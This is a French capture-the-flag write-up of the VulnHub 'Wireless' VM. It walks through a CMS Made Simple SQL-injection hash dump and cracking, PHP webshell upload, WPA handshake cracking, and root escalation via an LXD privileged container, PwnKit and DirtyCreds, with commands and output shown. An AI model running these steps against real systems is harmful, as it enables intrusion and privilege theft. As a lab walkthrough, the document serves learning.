# Solution du CTF Wireless de VulnHub

[Wireless](https://vulnhub.com/entry/wireless-1,669/) est un CTF créé par `Patel Kunal` et téléchargeable sur VulnHub. Il ne manquait pas d'originalité et était plutôt bien ficelé.

```
Nmap scan report for 192.168.56.107
Host is up (0.00026s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9ddba246557b5567e321c673628cf836 (RSA)
|   256 7fb7da42ca471e86566583e04fc7c4b6 (ECDSA)
|_  256 4b4c5be775ddcb4641a651445e472bbd (ED25519)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
8000/tcp open  http-alt   VOIP Server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2571
|     server: VOIP Server
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
|     <meta name="description" content="" />
|     <meta name="author" content="" />
|     <title>404 Error - VOIP Solutions</title>
|     <link href="/static/admin/css/styles.css" rel="stylesheet" />
|     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js" crossorigin="anonymous"></script>
|     </head>
|     <body>
|     <div id="layoutError">
|     <div id="layoutError_content">
|     <main>
|     <div class="container">
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 28199
|     server: VOIP Server
|     Vary: Cookie
|     Set-Cookie: session=eyJsb2dnZWRfaW4iOmZhbHNlfQ.Y-4V8A.AxNLf5rA0gmi_oZLXyEZMMWLxYo; HttpOnly; Path=/
|     <!DOCTYPE html>
|     <html lang="en">
|     <!-- Basic -->
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
|     <!-- Mobile Metas -->
|     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
|     <!-- Site Metas -->
|     <title>VOIP Solutions</title> 
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <!-- Site Icons -->
|     <link rel="shortcut icon" href="/static/images/favicon.ico" type="image/x-icon" />
|_    <link rel="apple-touch-icon" href="/static/images/apple-touch-icon.p
|_http-title: VOIP Solutions
|_http-server-header: VOIP Server
8080/tcp open  http-proxy Internal Server
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     server: Internal Server
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: 404 Not Found
|_http-server-header: Internal Server
```

On a un serveur Apache et deux autres serveurs web inconnus sur les ports 8000 et 8080.

## RCE Made Simple

Sur le port 80 je trouve via `Feroxbuster` une installation de `CMS Made Simple` sur le chemin `/cmsms`.

J'ai déjà croisé ce CMS sur [le CTF Christophe de VulnHub](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Christophe%20de%20VulnHub.md) et j'avais à cette occasion écrit un exploit pour la vulnérabilité. Il est donc temps de le réutiliser :

```shellsession
$ python devloop-cve-2019-9053.py --current-user http://192.168.56.107/cmsms/
INFO:root:[+] Fetching current user
juniordev@localhost
$ python devloop-cve-2019-9053.py --admin-hash http://192.168.56.107/cmsms/
admin name: juniordev
admin email: juniordev@wireless.com
admin hash: a25bb9e6782e7329c236d2538dd4f5ac
salt: 551c92a536111490
JohnTheRipper hash: juniordev:$dynamic_4$a25bb9e6782e7329c236d2538dd4f5ac$551c92a536111490:::::::
```

On peut casser le hash obtenu avec `John The Ripper` :

```shellsession
$ john --wordlist=rockyou.txt hash.txt 
Warning: detected hash type "osc", but the string is also recognized as "dynamic_4"
Use the "--format=dynamic_4" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (osc, osCommerce [md5($s.$p) (OSC) 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
passion          (juniordev)     
1g 0:00:00:00 DONE (11:48) 12.50g/s 21000p/s 21000c/s 21000C/s 123456..kenny
Use the "--show --format=osc" options to display all of the cracked passwords reliably
Session completed.
```

La technique d'obtention d'un RCE est la même que pour le précédent CTF cité, à savoir via le `File Manager` j'uploade un shell PHP sous le nom `shell.phar` dans la racine du site web.

Je peux ensuite uploader et faire exécuter un `reverse-sshx64` qui me permettra de taper mes commandes de manière intéractive.

Une fois obtenu cet accès je trouve aussi sous `/var/www/html` un dossier `playsms` qui propose sans doute un autre chemin pour parvenir au RCE (non étudié ici).

Je note au cas où les identifiants présents :

```php
$core_config['db']['type'] = 'mysqli';          // database engine
$core_config['db']['host'] = 'localhost';       // database host/server
$core_config['db']['port'] = '3306';    // database port
$core_config['db']['user'] = 'playsms'; // database username
$core_config['db']['pass'] = 'SecretPassword';  // database password
$core_config['db']['name'] = 'playsms'; // database name
```

Il y a aussi un hash en base qui correspond bêtement à `admin` :

```sql
MariaDB [playsms]> select username, password from playsms_tblUser;
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 21232f297a57a5a743894a0e4a801fc3 |
+----------+----------------------------------+
```

Je remarque que sur le sysème se trouve un utilisateur `coherer` qui possède le premier flag. On va devoir passer par ce compte pour aller plus loin :

```shellsession
www-data@VOIP:/home/coherer$ ls
total 28K
drwxr-xr-x 3 coherer coherer 4.0K Mar 19  2021 .
drwxr-xr-x 3 root    root    4.0K Mar 19  2021 ..
lrwxrwxrwx 1 root    root       9 Mar 19  2021 .bash_history -> /dev/null
-rw-r--r-- 1 coherer coherer  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 coherer coherer 3.7K Feb 25  2020 .bashrc
drwx------ 2 coherer coherer 4.0K Mar 19  2021 .cache
-rw-r--r-- 1 coherer coherer  807 Feb 25  2020 .profile
-rw-r--r-- 1 coherer coherer    0 Mar 19  2021 .sudo_as_admin_successful
-rw-r----- 1 coherer coherer   33 Mar 19  2021 local.txt
```

L'utilisateur n'a pas d'autres fichier sur le disque. Je regarde au cas où si des logs le concerne :

```shellsession
www-data@VOIP:/tmp$ grep -r coherer /var/log/ 2> /dev/null 
/var/log/cloud-init.log:2021-03-19 19:44:13,504 - __init__.py[DEBUG]: Adding user coherer
/var/log/cloud-init.log:2021-03-19 19:44:13,504 - subp.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'coherer', '--comment', 'coherer', '--groups', 'adm,cdrom,dip,plugdev,lxd,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
/var/log/cloud-init.log:2021-03-19 19:44:25,065 - cc_ssh_import_id.py[DEBUG]: User coherer is not configured for ssh_import_id
/var/log/apt/history.log:Requested-By: coherer (1000)
/var/log/apt/history.log:Requested-By: coherer (1000)
/var/log/apt/history.log:Requested-By: coherer (1000)
/var/log/apt/history.log:Requested-By: coherer (1000)
/var/log/apt/history.log:Requested-By: coherer (1000)
/var/log/apt/history.log:Requested-By: coherer (1000)
/var/log/apt/history.log:Requested-By: coherer (1000)
Binary file /var/log/wtmp matches
/var/log/installer/subiquity-client-debug.log.2181:2021-03-19 18:25:49,363 DEBUG subiquity.client.controllers.identity:49 IdentityController.done next_screen user_spec=IdentityData(realname='coherer', username='coherer', hostname='coherer')
/var/log/installer/subiquity-server-debug.log.2176:2021-03-19 18:25:49,369 DEBUG root:39 start: subiquity/Identity/POST: {"realname": "coherer", "username": "coherer", "crypted_password": "$6$982nPd...
Binary file /var/log/cloud-init-output.log matches
```

On voit un début de hash mais ce derner est tronqué...

## Retour vers le web

Sur le port 8000 on trouve un faux site pour une solution de VoIP. Dans l'ensemble le site est une coquille vide mais le lien pour se connecter semble valide.

Quand on affiche le code HTML de la page de login on voit une référence à un javascript :

```html
<script src="/static/js/login.js"></script>
```

Ce dernier contient visiblement du code obfusqué :

```js
/******************************************
    User Login
/****************************************** */


var delog = atob('dmFyIF8weGI1YzM9WyJceDZBXHg2OVx4NkVceDZEXHg2Rlx4NzJceDY5IiwiXHg1NFx4NjhceDY1XHgyMFx4NzFceDc1XHg2OVx4NjNceDZCXHgyMFx4NjJceDcyXHg2Rlx4NzdceDZFXHgyMFx4NjZceDZGXHg3OFx4MjBceDZBXHg3NVx4NkRceDcwXHg3M1x4MjBceDZGXHg3Nlx4NjVceDcyXHgyMFx4NzRceDY4XHg2NVx4MjBceDZDXHg2MVx4N0FceDc5XHgyMFx4NjRceDZGXHg2NyIsIlx4NjNceDY4XHg2MVx4NzJceDQzXHg2Rlx4NjRceDY1XHg0MVx4NzQiLCJceDY2XHg3Mlx4NkZceDZEXHg0M1x4NjhceDYxXHg3Mlx4NDNceDZGXHg2NFx4NjUiXTt2YXIgdT1fMHhiNWMzWzBdO3ZhciBzdHJpbmc9XzB4YjVjM1sxXTt2YXIgYT1zdHJpbmdbXzB4YjVjM1syXV0oMCk7dmFyIGI9c3RyaW5nW18weGI1YzNbMl1dKDM2KTt2YXIgYz1zdHJpbmdbXzB4YjVjM1syXV0oMik7dmFyIGQ9c3RyaW5nW18weGI1YzNbMl1dKDgpO3ZhciBlPXN0cmluZ1tfMHhiNWMzWzJdXSgxMyk7dmFyIGY9c3RyaW5nW18weGI1YzNbMl1dKDEyKTt2YXIgZz1zdHJpbmdbXzB4YjVjM1syXV0oMTQpO3ZhciBoPXN0cmluZ1tfMHhiNWMzWzJdXSg0MCk7dmFyIGk9c3RyaW5nW18weGI1YzNbMl1dKDEyKTt2YXIgcD1TdHJpbmdbXzB4YjVjM1szXV0oYSxiLGMsZCxlLGYsZyxoLGkp')
```

Si on affiche la variable `delog` dans la console des `developper tools` on voit que le JS décodé créé différentes variables dont `u` et `p` qui font penser à `username` et `password`.

Il s'agit bien de celà :

![Code JS déobfusqué](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/wireless_obfuscated_js.jpg)

Soit le nom d'utilisateur `jinmori` et le mot de passe `Taekwondo`.

On peut alors se connecter à la zone Admin sur l'appli web mais je n'y trouve rien de bien intéressant.

## Enumération à gogo

En fait il y a une section `VOIP LOGS` sur laquelle on trouve des données de communications SMS. Tout est encodé en hexadécimal donc le décodage est trivial. L'un des messages mentionne le nom DNS `wireless.com`.

C'est une information qui a eu peu d'impact à ce moment car je l'avais déjà croisé dans le fichier `/etc/apache2/sites-available/cmsms.conf` :

```apacheconf
<VirtualHost *:80>
 ServerAdmin admin@wireless.com
 DocumentRoot /var/www/html/cmsms
 ServerName wireless.com
 <Directory /var/www/html/cmsms/>
Options +FollowSymLinks
AllowOverride All
Order allow,deny
allow from all
 </Directory>
 ErrorLog /var/log/apache2/cmsms-error_log
 CustomLog /var/log/apache2/cmsms-access_log common
</VirtualHost>
```

et c'est aussi dans le fichier `/etc/hosts` de la VM :

```
127.0.0.1 localhost wireless.com
127.0.1.1 VOIP
```

Ce nom d'hôte semble avoir une utilité sur le port 8080 car au lieu d'obtenir une erreur 404 on obtient le message `Internal Portal v1`.

Une énumération des dossiers et fichiers sur le port ne remonte rien donc je tente une énumération d'hôtes virtuels. Attention à ne pas oublier de spécifier le port dans l'entête Host sans quoi ça ne marche pas (je suis passé par là) :

```shellsession
$ ffuf -w fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://wireless.com:8080/ -H "Host: FUZZ.wireless.com:8080"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://wireless.com:8080/
 :: Wordlist         : FUZZ: fuzzdb/discovery/dns//aTop1mAXFRcommonSubdomains.txt
 :: Header           : Host: FUZZ.wireless.com:8080
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

testing                 [Status: 200, Size: 4085, Words: 100, Lines: 100]
:: Progress: [50000/50000] :: Job [1/1] :: 406 req/sec :: Duration: [0:02:24] :: Errors: 0 ::
```

J'ai ensuite procédé à une énumération bête de ce que je trouvais donc `Feroxbuster` sur les dossiers :

```
405        4l       23w      178c http://testing.wireless.com:8080/login
500        4l       40w      290c http://testing.wireless.com:8080/get
```

Brute force de noms de paramètres sur le `get` :

```shellsession
$ ffuf -u "http://testing.wireless.com:8080/get?FUZZ=1" -w wordlists/common_query_parameter_names.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://testing.wireless.com:8080/get?FUZZ=1
 :: Wordlist         : FUZZ: wordlists/common_query_parameter_names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

msg                     [Status: 200, Size: 2, Words: 1, Lines: 1]
:: Progress: [5699/5699] :: Job [1/1] :: 250 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

Et pour les valeurs de `msg` :

```
clear
hello
help
hey
hi
logs
tools
```

Si on passe par exemple la valeur `help` on obtient :

```
Tools | Logs | Whoami | Clear |  Questions
```

Tout ça n'était pas forcément nécessaire car il y avait en fait une interface web épurée pour un chatbot sur la page d'index 😅

Quoiqu'il en soit si on saisit `tools` on a la liste suivante qui apparait :

```
Wireshark | Aircrack-ng | DDoS
```

et si on saisit `aircrack-ng` le site simule le lancement du logiciel et la capture d'un handshake `WPA-PSK` avant de nous donner le path vers la capture réseau.

## Crack It!

On peut extraire le hash du fichier pcap avec un outil de la suite `John The Ripper` :

```shellsession
$ wpapcap2john WPA-Capture.pcap  | tee hashes.txt
File WPA-Capture.pcap: Radiotap encapsulation
Dumping RSN IE PMKID at 5.649953 BSSID 00:0C:41:82:B2:55 ESSID 'Coherer' STA 00:0D:93:82:36:3A
Dumping M3/M2 at 5.655957 BSSID 00:0C:41:82:B2:55 ESSID 'Coherer' STA 00:0D:93:82:36:3A

2 ESSIDS processed and 1 AP/STA pairs processed
1 handshakes written, 1 RSN IE PMKIDs
Coherer:592da88096c461da246c69001e877f3d*000c4182b255*000d9382363a*436f6865726572:000d9382363a:000c4182b255:000c4182b255::PMKID:WPA-Capture.pcap
Coherer:$WPAPSK$Coherer#..l/Uf7J..qHUXMunTE3nfbMWSwxv27Ua0XutIOrfRSuv9gOCIugIVGlosMyXdNxfBZUAYmgKqeb6GBPxLiIZr56NtWTGR/Cp5ldAk61.5I0.Ec.2...........nTE3nfbMWSwxv27Ua0XutIOrfRSuv9gOCIugIVGlosM.................................................................3X.I.E..1uk0.E..1uk2.E..1uk0....................................................................................................................................................................................../t.....U...8FWdk8OpPckhewBwt4MXYI:000d9382363a:000c4182b255:000c4182b255::WPA2, verified:WPA-Capture.pcap
```

Le cassage n'aboutit pas avec `rockyou`... Sur le site web si on utilise la commande logs on obtient un fichier texte baptisé `Network.data`.

On va utiliser Python pour extraire chaque mot du texte et retirer les doublons :

```python
import string

with open("Network.data", "r") as file:
    contents = file.read()
    words = contents.split()
    words = [word.translate(str.maketrans('', '', string.punctuation)) for word in words]
    words = set(words)
    with open("wordlist.txt", "w") as fd:
        for word in words:
            print(word, file=fd)
```

Le hash se casse instantanément :

```shellsession
$ john --wordlist=wordlist.txt hashes.txt 
Warning: detected hash type "wpapsk", but the string is also recognized as "wpapsk-pmk"
Use the "--format=wpapsk-pmk" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 128/128 AVX 4x])
Will run 4 OpenMP threads
Note: Minimum length forced to 8 by format
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Induction        (Coherer)     
1g 0:00:00:00 DONE 7.692g/s 2523p/s 2523c/s 3507C/s Spending..uncommonly
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Le mot de passe obtenu sert bien sûr pour l'utilisateur système du même nom, celui qui dispose du premier flag :

```shellsession
coherer@VOIP:~$ cat local.txt 
4h1642b69b2a23bca3c5867u3f1ffd60
```

## Escalade des Alpes

Bien que l'on dispose du mot de passe, le scénario retenu sur ce CTF pour l'escalade de privilèges n'est pas un sudo mais un `lxd`.

Je reproduis ce que j'ai déjà fait pour le [CTF Djinn: 2](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Djinn%3A%202%20de%20VulnHub.md) :

```shellsession
coherer@VOIP:~$ id
uid=1000(coherer) gid=1000(coherer) groups=1000(coherer),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
coherer@VOIP:~$ lxc image list
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

+-------+-------------+--------+-------------+--------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+--------------+------+------+-------------+
coherer@VOIP:~$ lxc image import ./alpine*.tar.gz --alias myimage
Image imported with fingerprint: 32cabc616a1ef93f4948f82ad3606c4b28a7fe4a9f73d4b4c5b541a62bb1fff2
coherer@VOIP:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+--------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |  UPLOAD DATE |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+--------------+
| myimage | 32cabc616a1e | no     | alpine v3.13 (20210218_01:39) | x86_64       | CONTAINER | 5.63MB | Feb 16, 2023 |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+--------------+
coherer@VOIP:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm, ceph) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=5GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
coherer@VOIP:~$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
coherer@VOIP:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
coherer@VOIP:~$ lxc start mycontainer
coherer@VOIP:~$ lxc exec mycontainer /bin/sh
~ # cd /mnt/root/root
/mnt/root/root # ls
bot        build.sh   proof.txt  snap       voip
/mnt/root/root # cat proof.txt 
ba742c7ad39d517527f49590c02f76k9
```

En écrivant ce writeup je me rend compte que l'on peut donc bypasser le `CMS Made Simple` en commençant directement par le port 8000.

## Alternative Happy Ending

Mais on peut aussi passer de `www-data` à `root` via [PwnKit (CVE-2021-4034)](https://github.com/berdav/CVE-2021-4034) :

```shellsession
www-data@VOIP:/tmp/CVE-2021-4034$ export PATH=/usr/lib/gcc/x86_64-linux-gnu/9/:$PATH
www-data@VOIP:/tmp/CVE-2021-4034$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
www-data@VOIP:/tmp/CVE-2021-4034$ ./cve-2021-4034
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

On peut aussi utiliser [DirtyCreds - CVE-2022-2588](https://github.com/Markakd/CVE-2022-2588) :

```shellsession
www-data@VOIP:/tmp$ ./exp_file_credential 
self path /tmp/./exp_file_credential
prepare done
Old limits -> soft limit= 4096   hard limit= 4096 
starting exploit, num of cores: 1
defrag done
spray 256 done
freed the filter object
256 freed done
double free done
spraying files
found overlap, id : 213, 688
start slow write
closed overlap
got cmd, start spraying /etc/passwd
spray done
write done, spent 2.067049 s
should be after the slow write
succeed
www-data@VOIP:/tmp$ head -5 /etc/passwd
user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data@VOIP:/tmp$ su user
Password: 
# id
uid=0(user) gid=0(root) groups=0(root)
```

*Publié le 16 février 2023*
